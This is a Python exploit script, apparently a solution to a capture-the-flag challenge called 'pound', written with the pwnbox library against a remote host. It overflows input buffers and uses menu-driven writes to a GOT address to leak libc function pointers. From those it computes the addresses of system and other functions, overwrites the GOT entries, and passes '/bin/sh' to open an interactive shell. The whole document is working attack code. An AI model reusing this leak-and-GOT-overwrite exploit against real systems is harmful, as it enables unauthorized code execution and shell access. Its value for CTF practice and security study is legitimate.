import pwnbox
import struct

local = False

if local:
    p = pwnbox.pipe.ProcessPipe('gdb -q poundN')
else:
    p = pwnbox.pipe.SocketPipe('pound.pwning.xxx', 9765)

if local:
    p.read_until('(gdb)')
    p.write('r\n')

else:
#p.interact()
    p.read_until('3. Quit')
    p.write('2\n')

    p.read_until('Size:')
    p.write('N\n')
    p.read_until('Size:')
    p.write('N;\n')

def lobby():
    p.read_until('Choice:')

def first_in():
    p.read_until('state:')
    p.write('\x70'*512)
    p.read_until('state:')
    p.write('A'*(512-2))
    lobby()

def create_An(d, s):
    p.write('4\n')
    p.read_until(':')
    p.write('%d\n' % d)
    p.write(s+'\n')
    lobby()

def init(d):
    p.write('1\n')
    p.read_until('in:')
    p.write('%d\n' % d)
    lobby()

def for_propa(d):
    p.write('2\n')
    p.read_until('propagate:')
    p.write('%d\n' % d)
    lobby()


def print_leak():
    p.write('0\n')
    p.read_until('PSA: ')
    x = p.read_byte(8)
    x = struct.unpack('<II',x)
    lobby()
    return x

target = 0x0804b00c


first_in()

init(1094795585)

for_propa(target)
for_propa(100)


x = print_leak()

libc_printf = x[0]
libc_strcspn = x[1]

libc_base = libc_printf - 0x4cc40
libc_system = libc_base + 0x3fcd0
libc_fgets = libc_base + 0x63120
libc_malloc = libc_base + 0x75b30

print hex(libc_base)


create_An(30,struct.pack('<IIIII',libc_printf,libc_strcspn,libc_system,libc_fgets,libc_malloc))
create_An(200, '/bin/sh')

p.write('4\n')
p.read_until(':')
p.write('300\n')


p.interact()
